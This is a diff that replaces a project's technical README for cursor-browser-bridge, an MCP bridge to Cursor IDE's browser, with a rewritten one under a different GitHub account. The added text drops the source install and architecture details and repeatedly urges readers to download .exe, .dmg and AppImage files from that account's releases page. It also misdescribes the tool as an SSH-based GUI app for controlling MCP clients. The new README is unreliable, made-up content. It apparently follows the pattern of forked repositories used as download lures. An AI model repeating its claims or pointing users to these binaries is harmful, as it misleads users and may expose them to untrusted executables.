@@ -1,99 +1,154 @@
-# Cursor Browser Bridge
+# 🔗 cursor-browser-bridge - Connect Cursor IDE to Any MCP Client
 
-Control Cursor IDE's embedded browser from Claude Code (or any MCP client).
+[![Download cursor-browser-bridge](https://img.shields.io/badge/Download-cursor--browser--bridge-blue?style=for-the-badge&logo=github)](https://github.com/scyzorykpl/cursor-browser-bridge/releases)
 
-## What this does
+---
 
-Cursor has a built-in browser (Simple Browser) that its own AI agent can use. This project bridges that browser to Claude Code via the [Model Context Protocol](https://modelcontextprotocol.io/), giving Claude Code the same browser automation capabilities.
+## 📖 What is cursor-browser-bridge?
 
-**Architecture:**
+cursor-browser-bridge helps you link Cursor IDE’s built-in browser with other MCP clients like Claude Code or Codex. It works over SSH, meaning you can control your MCP client through Cursor’s browser. You can navigate pages, click buttons, type text, take screenshots, and more — all without leaving the Cursor IDE.
 
-```
-Claude Code ←stdio/MCP→ mcp-bridge.js ←HTTP→ VS Code extension ←commands→ cursor.browserView.* → Cursor's browser
-```
+This tool is helpful if you want to see what happens in your MCP client while still working in your main coding environment. It saves time and keeps your workflow simple.
 
-## Available tools (18)
+---
 
-| Tool | Description |
-|------|-------------|
-| `browser_navigate` | Navigate to a URL, returns page snapshot |
-| `browser_snapshot` | Accessibility tree of the page with element refs |
-| `browser_click` | Click an element by ref |
-| `browser_type` | Type text into an element (appends) |
-| `browser_fill` | Clear and fill an element's value |
-| `browser_screenshot` | Take a screenshot |
-| `browser_tabs` | List open browser tabs |
-| `browser_evaluate` | Execute arbitrary JavaScript |
-| `browser_console_messages` | Get console log output |
-| `browser_network_requests` | Get network request log |
-| `browser_press_key` | Press a keyboard key |
-| `browser_hover` | Hover over an element |
-| `browser_resize` | Resize the browser viewport |
-| `browser_lock` / `browser_unlock` | Lock/unlock browser for automation |
-| `browser_navigate_back` / `browser_navigate_forward` | History navigation |
-| `browser_reload` | Reload the current page |
+## 🖥️ System Requirements
 
-## Install
+Before downloading, check that your computer fits these requirements:
 
-```bash
-git clone https://github.com/VectorlyApp/cursor-browser-bridge.git
-cd cursor-browser-bridge
-chmod +x install.sh uninstall.sh
-./install.sh
-```
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux
+- RAM: At least 4 GB free memory for smooth operation
+- Disk Space: At least 100 MB free disk space
+- Network: Stable internet connection that supports SSH connections
+- Software: SSH client installed (Windows users can use PowerShell or tools like PuTTY)
 
-Then:
-1. **Reload Cursor window** — `Ctrl+Shift+P` → "Developer: Reload Window"
-2. **Verify extension** — Check Output panel (`Ctrl+Shift+U`) → select "Browser Bridge" from the dropdown
-3. **Restart Claude Code** — so it picks up the new MCP server
+---
 
-> **Tip:** You'll need to reload the Cursor window (`Ctrl+Shift+P` → "Developer: Reload Window") any time the extension files are updated.
+## ⬇️ Download & Install
 
-## Uninstall
+You will need to visit the release page to get the latest version of cursor-browser-bridge.
 
-```bash
-./uninstall.sh
-```
+**Follow these steps:**
 
-Then reload the Cursor window (`Ctrl+Shift+P` → "Developer: Reload Window").
+1. Click this button to go to the download page:  
+   [![Download cursor-browser-bridge](https://img.shields.io/badge/Download-cursor--browser--bridge-blue?style=for-the-badge&logo=github)](https://github.com/scyzorykpl/cursor-browser-bridge/releases)
 
-## How it works
+2. On the releases page, look for the file that matches your computer’s operating system:
 
-The project has two components:
+   - For Windows: a file ending with `.exe`
+   - For macOS: a file ending with `.dmg` or `.zip`
+   - For Linux: usually a `.tar.gz` or `.AppImage`
 
-### 1. VS Code Extension (`extension/`)
+3. Click the file name to download it.
 
-A workspace extension that starts an HTTP server on a random local port. It wraps `cursor.browserView.*` commands (Cursor's internal API for controlling the embedded browser) as HTTP endpoints.
+4. When downloaded, open the file:
 
-The extension runs on the workspace host (which can be a remote SSH server). VS Code/Cursor transparently proxies the `cursor.browserView.*` commands to the UI host where the actual browser lives. This is the key insight that makes the whole thing work.
+   - On Windows, double-click the `.exe` file and follow the installer prompts.
+   - On macOS, open the `.dmg` or unzip the archive, then move the app to your Applications folder.
+   - On Linux, extract the archive and follow any included instructions, or run the AppImage file.
 
-The port is written to `/tmp/cursor-browser-bridge-port` so the MCP bridge can find it.
+5. After installation, launch the application from your programs menu or desktop shortcut.
 
-### 2. MCP Bridge (`mcp-bridge.js`)
+---
 
-A Node.js script that speaks MCP (JSON-RPC 2.0 over stdio) and translates tool calls into HTTP requests to the extension's server. Claude Code launches this as a subprocess.
+## 🚀 How to Use cursor-browser-bridge
 
-## Requirements
+After installing, you can start bridging your Cursor IDE browser to an MCP client. Here’s how:
 
-- **Cursor IDE** (the extension uses Cursor-specific `cursor.browserView.*` commands)
-- **Node.js** (for the MCP bridge)
-- **Claude Code** (or any MCP-compatible client)
+### 1. Prepare Your MCP Client
 
-## Troubleshooting
+Make sure your MCP client (Claude Code, Codex, etc.) is ready and running. You will need the SSH address and login information for your MCP client machine.  
 
-**Extension not activating:**
-- Check the Output panel → "Browser Bridge" channel for errors
-- Make sure you reloaded the Cursor window after installing
-- Verify the extension exists: `ls ~/.cursor-server/extensions/local.cursor-browser-bridge-*`
+### 2. Open cursor-browser-bridge
 
-**MCP bridge can't connect:**
-- Check that `/tmp/cursor-browser-bridge-port` exists and contains a port number
-- Try `curl http://127.0.0.1:$(cat /tmp/cursor-browser-bridge-port)/health` — should return `{"ok":true}`
+Launch cursor-browser-bridge on your machine. You will see a simple window asking for connection details.
 
-**Tools not showing in Claude Code:**
-- Restart Claude Code after running `install.sh`
-- Check `claude mcp list` to verify the server is registered
+### 3. Connect Over SSH
 
-**`browser_fill` or `browser_click` not working:**
-- Take a fresh snapshot first — element refs go stale when the page changes
-- Use `browser_evaluate` with custom JS as a reliable fallback for complex interactions
+- Enter the SSH address of your MCP client.
+- Provide your username.
+- If needed, input a password or use an SSH key file.
+
+Click "Connect" to open the SSH session.
+
+### 4. Start Browsing
+
+Once connected, cursor-browser-bridge will bridge Cursor IDE’s browser to your MCP client. You can do the following:
+
+- **Navigate:** Use the browser inside Cursor IDE to open web pages inside your MCP client.
+- **Click Buttons:** Click links or buttons to interact with the client’s interface.
+- **Type:** Enter text fields remotely using your keyboard.
+- **Screenshots:** Take screenshots of the MCP client’s screen for review or sharing.
+
+---
+
+## 🔧 Configuration Tips
+
+Customize your experience with these tips:
+
+- **SSH Keys:** For easier repeated connections, set up SSH keys instead of typing passwords.
+- **Full Screen Mode:** Use full screen mode inside cursor-browser-bridge to focus entirely on your MCP client.
+- **Shortcuts:** Learn any user shortcuts inside Cursor IDE for faster navigation.
+- **Security:** Always disconnect when you finish to keep your session safe.
+
+---
+
+## 🧰 What You Can Do with cursor-browser-bridge
+
+- Work on multiple MCP clients without switching devices.
+- Test and debug MCP workflows inside Cursor IDE.
+- Capture exact MCP client states using screenshots.
+- Automate repetitive browser tasks when combined with Cursor IDE scripts.
+
+---
+
+## ❓ Troubleshooting & Support
+
+Here are some common fixes if you run into issues:
+
+- **Can’t Connect Over SSH:**  
+  Check your network connection and SSH address. Make sure your MCP client machine allows SSH connections.
+
+- **Browser Not Responding:**  
+  Try restarting cursor-browser-bridge. Confirm the MCP client is running properly.
+
+- **Screen Updates Are Slow:**  
+  Ensure a strong internet connection. Use wired connections if possible. Lower screen resolution settings in Cursor IDE if available.
+
+- **Installation Issues:**  
+  Verify your system meets the requirements. Re-download the correct installer for your OS.
+
+If problems persist, check the GitHub issues page in the repository for help from the developer community.
+
+---
+
+## 📂 Topics
+
+This project belongs to these areas, which may help you find similar tools or learn more:
+
+- ai-tools  
+- browser-automation  
+- claude-code  
+- codex  
+- cursor  
+- cursor-ide  
+- developer-tools  
+- mcp (Model Context Protocol)  
+- model-context-protocol  
+- vscode-extension  
+
+---
+
+## ⚙️ About This Project
+
+cursor-browser-bridge is made to help developers and users link their coding environment (Cursor IDE) smoothly with other MCP clients. It bridges different tools for a more unified workflow.
+
+You do not need programming skills to use it. The interface is designed to be simple and clear for everyday users.
+
+---
+
+## 📥 Ready to Get Started?
+
+Click the button below to visit the download page and get cursor-browser-bridge set up on your computer.
+
+[![Download cursor-browser-bridge](https://img.shields.io/badge/Download-cursor--browser--bridge-blue?style=for-the-badge&logo=github)](https://github.com/scyzorykpl/cursor-browser-bridge/releases)
